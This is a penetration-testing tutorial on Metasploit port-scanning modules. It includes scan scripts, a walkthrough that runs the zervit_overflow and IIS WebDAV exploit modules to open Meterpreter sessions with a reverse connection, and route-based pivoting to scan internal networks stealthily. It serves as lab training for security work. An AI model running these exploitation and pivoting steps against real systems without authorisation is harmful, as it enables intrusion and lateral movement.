# Metasploit Auxiliary Modules for Port Scanning

## Overview

Metasploit's auxiliary modules provide powerful scanning capabilities that integrate directly with the framework's database and pivoting functionality. Unlike standalone tools like Nmap, these modules can leverage existing compromised systems to scan internal networks during post-exploitation.

## Auxiliary Modules Explained

### What are Auxiliary Modules?

- Perform non-exploitation activities (scanning, discovery, fuzzing)
- Cannot be paired with payloads
- Used for information gathering and enumeration
- Integrate results directly into Metasploit's database

### Key Advantages Over External Tools

- **Pivoting Capability**: Scan internal networks through compromised hosts
- **Database Integration**: Automatic storage of results
- **Session Management**: Leverage existing Meterpreter sessions
- **Stealth**: Operate through already-established access points

## Lab Environment Setup

For practical exercises, use the **Metasploitable 3** lab from Rapid7:

**Lab URL**: [Metasploitable 3 GitHub Repository](https://github.com/rapid7/metasploitable3)

**Setup Requirements**:

- VirtualBox or VMware
- Vagrant
- 4GB+ RAM recommended
- Windows or Linux host system

**Build Command**:

```bash
git clone https://github.com/rapid7/metasploitable3.git
cd metasploitable3
./build.sh windows2008    # or ubuntu1404
```

## Basic TCP Port Scanning

### Finding Port Scan Modules

```bash
# Search for port scanning modules
msf6 > search portscan

# Sample output:
# 4   auxiliary/scanner/portscan/ack
# 5   auxiliary/scanner/portscan/syn
# 6   auxiliary/scanner/portscan/tcp
# 7   auxiliary/scanner/portscan/xmas
```

### Basic TCP Port Scan

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp) > run
```

### Dynamic Target Scanning Script

```bash
#!/bin/bash

# Set target from command line argument
TARGET=$1
PORT_RANGE=${2:-"1-1000"}

echo "[*] Starting Metasploit TCP port scan"
echo "[*] Target: $TARGET"
echo "[*] Port range: $PORT_RANGE"

msfconsole -q -x "
workspace -a port_scan_$(date +%Y%m%d);
use auxiliary/scanner/portscan/tcp;
set RHOSTS $TARGET;
set PORTS $PORT_RANGE;
set THREADS 10;
run;
exit"
```

**Usage**:

```bash
chmod +x tcp_scan.sh
./tcp_scan.sh 192.168.1.100
./tcp_scan.sh 192.168.1.100 "1-10000"
```

## Advanced Pivoting Scenario

### Complete Pivoting Workflow

#### Step 1: Initial Compromise and Service Identification

```bash
# Initial port scan reveals web service
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.50
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 80,443,8080
msf6 auxiliary(scanner/portscan/tcp) > run

[*] 192.168.1.50:80 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
```

#### Step 2: Web Application Enumeration

```bash
# Check web application
msf6 > curl http://192.168.1.50

# Identify vulnerable application (example: Zervit 0.4)
msf6 > search zervit
msf6 > use exploit/windows/http/zervit_overflow
msf6 exploit(windows/http/zervit_overflow) > set RHOSTS 192.168.1.50
msf6 exploit(windows/http/zervit_overflow) > set TARGETURI /
msf6 exploit(windows/http/zervit_overflow) > exploit

[*] Sending stage (175174 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.50:49162)
```

#### Step 3: Post-Exploitation Network Discovery

```bash
meterpreter > sysinfo
Computer        : VICTIM-PC
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > shell
C:\>ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : localdomain
   IPv4 Address. . . . . . . . . . . : 192.168.1.50
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1

Ethernet adapter Ethernet1:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.10.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```

#### Step 4: Setting Up the Pivot

```bash
meterpreter > background
[*] Backgrounding session 1...

msf6 > route add 10.10.10.0/24 1
[*] Route added

# Verify route
msf6 > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1
```

#### Step 5: Internal Network Scanning Through Pivot

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.3
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,443,21,3389
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 5
msf6 auxiliary(scanner/portscan/tcp) > run

[*] 10.10.10.3:21 - TCP OPEN
[*] 10.10.10.3:22 - TCP OPEN
[*] 10.10.10.3:80 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
```

## UDP Scanning with Auxiliary Modules

### UDP Sweep Module

```bash
msf6 > search udp_sweep
msf6 > use auxiliary/scanner/discovery/udp_sweep
msf6 auxiliary(scanner/discovery/udp_sweep) > show options

Module options (auxiliary/scanner/discovery/udp_sweep):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS    10               yes       The number of concurrent threads

msf6 auxiliary(scanner/discovery/udp_sweep) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/discovery/udp_sweep) > run
```

## Advanced Scanning Techniques

### SYN Scan (Stealth)

```bash
msf6 > use auxiliary/scanner/portscan/syn
msf6 auxiliary(scanner/portscan/syn) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/portscan/syn) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/syn) > set THREADS 20
msf6 auxiliary(scanner/portscan/syn) > run
```

### Comprehensive Network Assessment Script

```bash
#!/bin/bash

TARGET_NETWORK=$1
OUTPUT_DIR="./scan_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR

echo "[*] Starting comprehensive network assessment"
echo "[*] Target: $TARGET_NETWORK"
echo "[*] Output: $OUTPUT_DIR"

msfconsole -q -x "
workspace -a network_assessment;
use auxiliary/scanner/portscan/tcp;
set RHOSTS $TARGET_NETWORK;
set PORTS 1-10000;
set THREADS 20;
run;
use auxiliary/scanner/discovery/udp_sweep;
set RHOSTS $TARGET_NETWORK;
run;
services;
exit" > $OUTPUT_DIR/scan_results.txt

echo "[+] Assessment complete. Results saved to $OUTPUT_DIR/"
```

**Usage**:

```bash
./network_assessment.sh 192.168.1.0/24
```

## Practical Example: Complete Internal Assessment

### Scenario Setup

```bash
# Initial external scan reveals web server
./tcp_scan.sh 203.0.113.10

# Discover and exploit vulnerable web application
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOSTS 203.0.113.10
msf6 exploit(windows/iis/iis_webdav_upload_asp) > exploit

[*] Meterpreter session 1 opened
```

### Internal Network Enumeration Through Pivot

```bash
# Discover internal network configuration
meterpreter > run post/windows/gather/arp_scanner RHOSTS 192.168.2.0/24

# Add route for internal network
meterpreter > background
msf6 > route add 192.168.2.0/24 1

# Scan internal hosts through pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.2.20-192.168.2.50
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,443,21,25,53,110,143,993,995,3389
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
msf6 auxiliary(scanner/portscan/tcp) > run
```

## Best Practices

1. **Thread Management**: Adjust threads based on network conditions and stealth requirements
2. **Port Selection**: Use common port ranges initially, expand based on findings
3. **Database Integration**: Always use workspaces to organize results
4. **Route Verification**: Confirm pivot routes before internal scanning
5. **Stealth Considerations**: Use SYN scans and adjust timing for sensitive environments
6. **Result Documentation**: Use Metasploit's built-in reporting features

## Next Steps

After port scanning:

1. Use service-specific auxiliary modules for deeper enumeration
2. Import results into vulnerability assessment workflows
3. Chain discoveries for comprehensive network mapping
4. Generate professional reports from collected data

This approach enables seamless transition from external reconnaissance to internal network mapping while maintaining operational security and comprehensive result tracking.
